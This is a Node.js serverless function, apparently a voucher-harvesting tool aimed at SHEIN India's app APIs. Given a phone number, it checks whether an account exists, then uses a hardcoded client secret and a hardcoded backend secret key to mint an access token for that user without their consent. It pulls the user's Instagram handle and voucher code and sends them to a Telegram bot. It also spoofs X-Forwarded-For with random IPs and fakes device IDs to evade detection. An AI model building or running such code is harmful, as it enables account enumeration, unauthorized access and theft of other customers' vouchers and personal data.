const axios = require('axios');

// Configuration
const TELEGRAM_BOT_TOKEN = ''; // Will be overridden by user input
const TELEGRAM_CHAT_ID = ''; // Will be overridden by user input

async function sendToTelegram(message, botToken, chatId) {
    if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN' || chatId === 'YOUR_CHAT_ID') {
        return false;
    }
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        console.error('Telegram send error:', error.message);
        return false;
    }
}

function generateRandomIp() {
    return `${Math.floor(Math.random() * 100 + 100)}.${Math.floor(Math.random() * 240 + 10)}.${Math.floor(Math.random() * 240 + 10)}.${Math.floor(Math.random() * 249 + 1)}`;
}

function generateDeviceId() {
    return Array.from({ length: 16 }, () => 
        Math.floor(Math.random() * 16).toString(16)
    ).join('');
}

async function httpCall(url, data = null, headers = [], method = 'GET', returnHeaders = false) {
    try {
        const config = {
            method,
            url,
            headers: headers.reduce((acc, header) => {
                const [key, value] = header.split(': ');
                acc[key] = value;
                return acc;
            }, {}),
            maxRedirects: 5,
            timeout: 10000
        };

        if (method.toUpperCase() === 'POST') {
            config.data = data;
        } else if (data) {
            config.params = data;
        }

        const response = await axios(config);
        return returnHeaders ? response : response.data;
    } catch (error) {
        if (error.response) {
            return returnHeaders ? error.response : error.response.data;
        }
        throw error;
    }
}

async function checkNumber(number, botToken, chatId) {
    const ip = generateRandomIp();
    const adId = generateDeviceId();

    try {
        // Step 1: Get access token
        const tokenUrl = "https://api.services.sheinindia.in/uaas/jwt/token/client";
        const tokenHeaders = [
            "Client_type: Android/29",
            "Accept: application/json",
            "Client_version: 1.0.8",
            "User-Agent: Android",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "X-Tenant: B2C",
            "Content-Type: application/x-www-form-urlencoded",
            `X-Forwarded-For: ${ip}`
        ];

        const tokenData = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
        const tokenRes = await httpCall(tokenUrl, tokenData, tokenHeaders, "POST");
        
        let access_token;
        try {
            const tokenJson = typeof tokenRes === 'string' ? JSON.parse(tokenRes) : tokenRes;
            access_token = tokenJson.access_token;
        } catch (e) {
            return { status: 'error', error: 'Failed to parse token response' };
        }

        if (!access_token) {
            return { status: 'error', error: 'No access token' };
        }

        // Step 2: Account check
        const accountUrl = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.2.0";
        const accountHeaders = [
            `Authorization: Bearer ${access_token}`,
            "Requestid: account_check",
            "X-Tenant: B2C",
            "Accept: application/json",
            "User-Agent: Android",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "Content-Type: application/x-www-form-urlencoded",
            `X-Forwarded-For: ${ip}`
        ];

        const accountData = `mobileNumber=${number}`;
        const accountRes = await httpCall(accountUrl, accountData, accountHeaders, "POST");
        
        let accountJson;
        try {
            accountJson = typeof accountRes === 'string' ? JSON.parse(accountRes) : accountRes;
        } catch (e) {
            return { status: 'error', error: 'Failed to parse account response' };
        }

        if (accountJson.success === false) {
            return { status: 'not_registered', number };
        }

        const encryptedId = accountJson.encryptedId;
        if (!encryptedId) {
            return { status: 'error', error: 'No encrypted ID' };
        }

        // Step 3: Generate token
        const generateTokenUrl = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
        const generateTokenHeaders = [
            "Accept: application/json",
            "User-Agent: Android",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "Content-Type: application/json; charset=UTF-8",
            `X-Forwarded-For: ${ip}`
        ];

        const payload = JSON.stringify({
            client_type: "Android/29",
            client_version: "1.0.8",
            gender: "",
            phone_number: number,
            secret_key: "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            user_id: encryptedId,
            user_name: ""
        });

        const generateTokenRes = await httpCall(generateTokenUrl, payload, generateTokenHeaders, "POST");
        
        let generateTokenJson;
        try {
            generateTokenJson = typeof generateTokenRes === 'string' ? JSON.parse(generateTokenRes) : generateTokenRes;
        } catch (e) {
            return { status: 'registered_no_voucher', number };
        }

        const sheinverse_access_token = generateTokenJson.access_token;
        if (!sheinverse_access_token) {
            return { status: 'registered_no_voucher', number };
        }

        // Step 4: Get user data
        const userUrl = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
        const userHeaders = [
            "Host: shein-creator-backend-151437891745.asia-south1.run.app",
            `Authorization: Bearer ${sheinverse_access_token}`,
            "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36",
            "Accept: */*",
            "Origin: https://sheinverse.galleri5.com",
            "X-Requested-With: com.ril.shein",
            "Referer: https://sheinverse.galleri5.com/",
            "Content-Type: application/json",
            `X-Forwarded-For: ${ip}`
        ];

        const userRes = await httpCall(userUrl, null, userHeaders, "GET");
        
        let userJson;
        try {
            userJson = typeof userRes === 'string' ? JSON.parse(userRes) : userRes;
        } catch (e) {
            return { status: 'registered_no_voucher', number };
        }

        if (!userJson.user_data || !userJson.user_data.instagram_data || !userJson.user_data.instagram_data.username) {
            return { status: 'registered_no_voucher', number };
        }

        const username = userJson.user_data.instagram_data.username;
        const voucher = userJson.user_data.voucher_data?.voucher_code || null;
        
        if (!voucher) {
            return { status: 'registered_no_voucher', number };
        }

        const result = {
            status: 'success',
            number,
            instagram: username,
            voucherCode: voucher,
            voucherAmount: userJson.user_data.voucher_data?.voucher_amount || 'N/A',
            minPurchase: userJson.user_data.voucher_data?.min_purchase_amount || 'N/A',
            expiry: userJson.user_data.voucher_data?.expiry_date || 'N/A'
        };

        // Send to Telegram if voucher found
        if (voucher && botToken && chatId) {
            const telegramMessage = `
🎉 <b>VOUCHER FOUND!</b> 🎉

📱 <b>Number:</b> ${number}
📸 <b>Instagram:</b> ${username}
🎫 <b>Voucher Code:</b> <code>${voucher}</code>
💰 <b>Amount:</b> ₹${result.voucherAmount}
🛒 <b>Min Purchase:</b> ₹${result.minPurchase}
⏰ <b>Expiry:</b> ${result.expiry}

<a href="https://t.me/share/url?url=${voucher}">Click to share</a>
            `;
            
            await sendToTelegram(telegramMessage, botToken, chatId);
        }

        return result;

    } catch (error) {
        console.error('Error in checkNumber:', error.message);
        return { status: 'error', error: error.message };
    }
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { number, botToken, chatId } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'Number is required' });
    }

    try {
        const result = await checkNumber(number, botToken, chatId);
        res.json(result);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }

};
